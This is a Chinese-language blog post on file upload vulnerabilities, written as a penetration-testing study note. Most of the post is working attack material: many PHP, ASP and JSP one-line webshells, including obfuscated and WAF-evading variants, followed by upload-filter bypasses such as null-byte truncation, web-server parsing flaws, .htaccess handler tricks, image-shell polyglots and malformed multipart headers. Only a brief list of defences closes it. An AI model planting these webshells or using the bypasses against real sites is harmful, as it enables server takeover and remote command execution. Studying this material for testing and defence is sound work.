<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.8.0"><meta charset="utf-8"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="yes" name="apple-touch-fullscreen"><meta content="telephone=no,email=no" name="format-detection"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no"><link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon"><link href="https://fonts.googleapis.com/css?family=Rubik" rel="stylesheet"><script src="https://use.fontawesome.com/adaf0e149c.js"></script><link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.6.0/styles/monokai_sublime.min.css"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="/css/post.css"><link rel="stylesheet" href="/css/markdown-github.css"><title>zhang's blog</title><script src="/js/googleAnalytics.js"></script></head><body><div id="postContainer"><div id="postTop"><h4 id="logo">Life Is Short</h4><br><br><h2 id="postTitle">文件上传漏洞</h2><br><span aria-hidden="true" class="postTime fa fa-calendar">2019-1-20</span><br><br></div><section id="articleDiv"><p></p><p>前言:文件上传漏洞可以说是渗透测试用得最多的一个漏洞，因为用它获得服务器权限最快最直接。本次了解一下上传漏洞。</p><p></p>
<p></p><h3 id="webshell与中国菜刀"><a href="#webshell与中国菜刀" class="headerlink" title="webshell与中国菜刀"></a>webshell与中国菜刀</h3><h4 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h4><p>黑客在入侵一个网站后，会留下一个asp或php网站web服务器进行交互，得到一个命令执行环境，以达到控制网站服务器的目的。这个后门就是webshell。</p><p></p>
<h4 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h4><p>可以管理动态脚本，他的控制端仅仅需要一句话，被当作管理webshell的工具使用</p><br><h2 id="一句话木马-webshell的一种"><a href="#一句话木马-webshell的一种" class="headerlink" title="一句话木马(webshell的一种)"></a>一句话木马(webshell的一种)</h2><h3 id="php一句话木马"><a href="#php一句话木马" class="headerlink" title="php一句话木马"></a>php一句话木马</h3><h4 id="eval函数"><a href="#eval函数" class="headerlink" title="eval函数"></a>eval函数</h4><p>把字符串按照php代码来计算，该字符必须是合法的php代码，且以分号结尾。</p><br><h4 id="assert函数"><a href="#assert函数" class="headerlink" title="assert函数"></a>assert函数</h4><p>检查一个断言是否为 FALSE</p><br><h4 id="POST"><a href="#POST" class="headerlink" title="$_POST"></a>$_POST</h4><p>php超全局变量用于收集表单数据，是由post方法发送</p><br><h4 id="GET"><a href="#GET" class="headerlink" title="$_GET"></a>$_GET</h4><p>php超全局变量用于收集表单数据，是由get方法发送</p><br><h4 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h4><p>既可以接收post请求也可以接收get请求</p><br><h4 id="一句话木马简单写"><a href="#一句话木马简单写" class="headerlink" title="一句话木马简单写"></a>一句话木马简单写</h4><p>&lt;?php  eval($_POST[‘pass’]);  ?&gt;</p><br><p>&lt;?php  assert($_POST[‘pass’]); ?&gt;</p><br><p>&lt;?php system($_REQUEST[‘pass’]);?&gt;</p><br><p>&lt;?fputs(fopen(c.php,w),&lt;?eval($_POST[c]);?&gt;)?&gt;</p><br><!-- <?$_POST['sa']($_POST['sb']);?> --><br><p>&lt;?php $k = str_replace(“8”,””,”a8s88s8e8r88t”);$k($_POST[“8”]); ?&gt;</p><br><h4 id="一句话木马变形"><a href="#一句话木马变形" class="headerlink" title="一句话木马变形"></a>一句话木马变形</h4><p>&lt;?php</p><br><p>$a=md5(‘a’).’<br>‘;</p><br><p>$poc=substr($a,14,1).chr(115).chr(115).substr($a,22,1).chr(114).chr(116);</p><br><p>$poc($_GET[‘a’]);</p><br><p>?&gt;</p><br><p>&lt;?php</p><br><p>function kill($ki,$ke){</p><br><pre><code>define($ki,$ke);<br></code></pre><p>}</p><br><p>kill(“NA”,”$_POST[x]”);</p><br><p>eval(NA);</p><br><p>echo NA;</p><br><p>?&gt;</p><br><p>&lt;?php </p><br><p>if(isset($_POST[‘content’]) &amp;&amp; isset($_POST[‘ext’]))</p><br><p>{</p><br><pre><code>$data = $_POST[&apos;content&apos;];<br><br> $ext = $_POST[&apos;ext&apos;];<br><br><br> //var_dump(preg_match(&apos;/\&lt;/&apos;,$data));<br><br> if(preg_match(&apos;/\&lt;/&apos;,$data))<br>  {<br><br>die(&apos;hack&apos;);<br><br>   }<br></code></pre><p>$filename = time();</p><br><p>file_put_contents($filename.$ext, $data);<br>}</p><br><p>?&gt;</p><br><p>content[]=&lt;?php phpinfo();?&gt;&amp;ext=php</p><br><h4 id="过狗一句话木马"><a href="#过狗一句话木马" class="headerlink" title="过狗一句话木马"></a>过狗一句话木马</h4><h5 id="1-将关键字替换"><a href="#1-将关键字替换" class="headerlink" title="1.将关键字替换"></a>1.将关键字替换</h5><h5 id="2-使用回调函数"><a href="#2-使用回调函数" class="headerlink" title="2.使用回调函数"></a>2.使用回调函数</h5><p>(1)create_function主要用来创建匿名函数，如果没有严格对参数传递进行过滤，攻击者可以构造特殊字符串传递给create_function()执行任意命令</p><br><p>&lt;?php </p><br><p>//?cmd=phpinfo();</p><br><p>$func =create_function(‘’,$_REQUEST[‘cmd’]);</p><br><p>$func();</p><br><p>?&gt;</p><br><p>(2)array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。</p><br><p>(3)call_user_func — 把第一个参数作为回调函数调用,其余参数是回调函数的参数.</p><br><p>(4)array_filter()依次将 array 数组中的每个值传递到 callback 函数。如果 callback 函数返回 true，则 array 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。</p><br><p>(5)file_put_contents() 函数把一个字符串写入文件中。</p><br><p>(6)fputs() 函数写入文件</p><br><p>一个过狗的一句话木马变形</p><br><p>&lt;?php</p><br><p>@$a=array($_POST[‘pass’]);</p><br><p>@$b=array($_POST[‘pass’]);</p><br><p>array_udiff_uassoc($a,$b,’assert’,’assert’);</p><br><p>?&gt;</p><br><h3 id="asp一句话木马"><a href="#asp一句话木马" class="headerlink" title="asp一句话木马"></a>asp一句话木马</h3><h4 id="asp一句话木马简单写"><a href="#asp一句话木马简单写" class="headerlink" title="asp一句话木马简单写"></a>asp一句话木马简单写</h4><p>&lt;%eval request(“pass”);%&gt;</p><br><p>&lt;%execute request(“pass”)%&gt;</p><br><p>&lt;%eval_r(Request(“0x001”))%&gt;</p><br><p>&lt;%ExecuteGlobal request(“pass”)%&gt;</p><br><p>&lt;%Eval(Request(chr(35)))%&gt;</p><br><h4 id="asp一句话木马变形"><a href="#asp一句话木马变形" class="headerlink" title="asp一句话木马变形"></a>asp一句话木马变形</h4><p>&lt;%</p><br><p>Function MorfiCoder(Code)</p><br><p>MorfiCoder=Replace(Replace(StrReverse(Code),”/<em>/“,””””),”\</em>\”,vbCrlf)</p><br><p>End Function</p><br><p>Execute MorfiCoder(“)/<em>/z/</em>/(tseuqer lave”)</p><br><p>%&gt;</p><br><h4 id="asp过狗一句话木马"><a href="#asp过狗一句话木马" class="headerlink" title="asp过狗一句话木马"></a>asp过狗一句话木马</h4><p>&lt;%@ LANGUAGE = “VBScript.Encode”%&gt;</p><br><p>&lt;%#@~^IQAAAA==3X+^!YMVK4msPM+5E/OcrSl    [MM+Xrb+AsAAA==^#~@%&gt;</p><br><h4 id="jsp一句话木马"><a href="#jsp一句话木马" class="headerlink" title="jsp一句话木马"></a>jsp一句话木马</h4><p><code>&lt;% if(request.getParameter(&quot;f&quot;)!=null)(new java.io.FileOutputStream(application.getRealPath(&quot;\&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes()); %&gt;</code></p><br><p>&lt;%Runtime.getRuntime().exec(request.getParameter(“i”));%&gt;</p><br><p>&lt;%new java.io.FileOutputStream(request.getParameter(“f”)).write(request.getParameter(“c”).getBytes());%&gt;</p><br><h3 id="更多webshell请到https-github-com-tennc-webshell"><a href="#更多webshell请到https-github-com-tennc-webshell" class="headerlink" title="更多webshell请到https://github.com/tennc/webshell"></a>更多webshell请到<a href="https://github.com/tennc/webshell" target="_blank" rel="noopener">https://github.com/tennc/webshell</a></h3><h2 id="文件上传检测"><a href="#文件上传检测" class="headerlink" title="文件上传检测"></a>文件上传检测</h2><h3 id="前端检测"><a href="#前端检测" class="headerlink" title="前端检测"></a>前端检测</h3><h4 id="js校验"><a href="#js校验" class="headerlink" title="js校验"></a>js校验</h4><p>绕过方法</p><br><p>1.禁用，删除，修改js</p><br><p>2.使用代理上传</p><br><h3 id="后端检测"><a href="#后端检测" class="headerlink" title="后端检测"></a>后端检测</h3><h4 id="mime文件类型校验"><a href="#mime文件类型校验" class="headerlink" title="mime文件类型校验"></a>mime文件类型校验</h4><p>绕过方法</p><br><p>使用burpsuite修改mime文件类型</p><br><h4 id="扩展名验证"><a href="#扩展名验证" class="headerlink" title="扩展名验证"></a>扩展名验证</h4><h5 id="白名单验证"><a href="#白名单验证" class="headerlink" title="白名单验证"></a>白名单验证</h5><p>绕过方法:</p><br><p>(1)00截断   (php5.2) 特性  路径的截断  eq:404.php%00.jpg</p><br><p>(2)ntfs文件流截断 (windows)</p><br><p>(3)解析漏洞</p><br><p>1.iis6.0解析漏洞</p><br><p><a href="http://www.xxx.com/xx.asp/xx.jpg" target="_blank" rel="noopener">www.xxx.com/xx.asp/xx.jpg</a></p><br><p><a href="http://www.xxx.com/xx.asp;.jpg" target="_blank" rel="noopener">www.xxx.com/xx.asp;.jpg</a></p><br><p>便可以解析为asp文件</p><br><p>2.apache解析漏洞</p><br><p>test.php.a.b(不能利用)</p><br><p>3.nginx1.4.6解析漏洞</p><br><p><a href="http://www.xxx.com/upload/1.jpg%00.php" target="_blank" rel="noopener">www.xxx.com/upload/1.jpg%00.php</a></p><br><p><a href="http://www.xxx.com/upload/1.jpg%20\0.php" target="_blank" rel="noopener">www.xxx.com/upload/1.jpg%20\0.php</a></p><br><p>4.iis7.5解析漏洞</p><br><p>与nginx类似<a href="http://www.xxx.com/upload/1.jpg/1.php" target="_blank" rel="noopener">www.xxx.com/upload/1.jpg/1.php</a></p><br><h5 id="黑名单验证"><a href="#黑名单验证" class="headerlink" title="黑名单验证"></a>黑名单验证</h5><p>1.大小写绕过(windows不区分大小写，linux区分大小写，不能用大小写绕过)</p><br><p>2.黑名单扩展名漏网</p><br><p>.php3  .phtml .cer .jspx .aspx .htaccess</p><br><p>.htaccess</p><br><p>SetHandler application/x-httpd-php</p><br><p>AddHandler application/x-httpd-php  .txt .jpg</p><br><p>3.windows系统漏洞</p><br><p>test.asp(空格)</p><br><p>test.php.</p><br><p>test.php::$DATA</p><br><h4 id="文件内容校验"><a href="#文件内容校验" class="headerlink" title="文件内容校验"></a>文件内容校验</h4><p>绕过方法:制作图片马</p><br><p>1.copy a.jpg /b + b.php /a hack.php  (windwos)</p><br><p>2.cat a.php &gt;&gt; b.jpg   (linux)</p><br><p>3.winhex编辑</p><br><h3 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h3><h4 id="1-垃圾数据"><a href="#1-垃圾数据" class="headerlink" title="1.垃圾数据"></a>1.垃圾数据</h4><p>有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验；</p><br><h4 id="2-filename"><a href="#2-filename" class="headerlink" title="2.filename"></a>2.filename</h4><p>针对早期版本安全狗，可以多加一个filename</p><br><h4 id="3-waf本身缺陷"><a href="#3-waf本身缺陷" class="headerlink" title="3.waf本身缺陷"></a>3.waf本身缺陷</h4><p>删除实体里面的Conten-Type字段</p><br><p>删除Content-Disposition字段里的空格</p><br><p>修改Content-Disposition字段值的大小写</p><br><p>Boundary边界不一致</p><br><p>文件名处回车</p><br><p>多个Content-Disposition</p><br><h4 id="4-文件重命名绕过"><a href="#4-文件重命名绕过" class="headerlink" title="4.文件重命名绕过"></a>4.文件重命名绕过</h4><h4 id="5-特殊的长文件名绕过"><a href="#5-特殊的长文件名绕过" class="headerlink" title="5.特殊的长文件名绕过"></a>5.特殊的长文件名绕过</h4><p>shell.asp;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王.jpg</p><br><h4 id="6-反删除"><a href="#6-反删除" class="headerlink" title="6.反删除"></a>6.反删除</h4><h3 id="文件上传防护"><a href="#文件上传防护" class="headerlink" title="文件上传防护"></a>文件上传防护</h3><h4 id="1-最有效的，将文件上传目录直接设置为不可执行"><a href="#1-最有效的，将文件上传目录直接设置为不可执行" class="headerlink" title="1.最有效的，将文件上传目录直接设置为不可执行"></a>1.最有效的，将文件上传目录直接设置为不可执行</h4><h4 id="2-对文件类型检查：强烈推荐白名单方式，结合MIME-Type、后缀检查等方式"><a href="#2-对文件类型检查：强烈推荐白名单方式，结合MIME-Type、后缀检查等方式" class="headerlink" title="2.对文件类型检查：强烈推荐白名单方式，结合MIME Type、后缀检查等方式"></a>2.对文件类型检查：强烈推荐白名单方式，结合MIME Type、后缀检查等方式</h4><h4 id="3-使用随机数改写文件名和文件路径"><a href="#3-使用随机数改写文件名和文件路径" class="headerlink" title="3.使用随机数改写文件名和文件路径"></a>3.使用随机数改写文件名和文件路径</h4><h4 id="4-单独设置文件服务器的域名-成本比较高"><a href="#4-单独设置文件服务器的域名-成本比较高" class="headerlink" title="4.单独设置文件服务器的域名(成本比较高)"></a>4.单独设置文件服务器的域名(成本比较高)</h4><h4 id="5-可以安装服务器安全狗和网站安全狗，对服务器和网站进行安全守护"><a href="#5-可以安装服务器安全狗和网站安全狗，对服务器和网站进行安全守护" class="headerlink" title="5.可以安装服务器安全狗和网站安全狗，对服务器和网站进行安全守护"></a>5.可以安装服务器安全狗和网站安全狗，对服务器和网站进行安全守护</h4><h4 id="6-隐藏上传文件路径"><a href="#6-隐藏上传文件路径" class="headerlink" title="6.隐藏上传文件路径"></a>6.隐藏上传文件路径</h4></section></div><script src="/js/jquery.min.js"></script><script src="/js/highlight.min.js"></script><script src="/js/start.js"></script></body></html>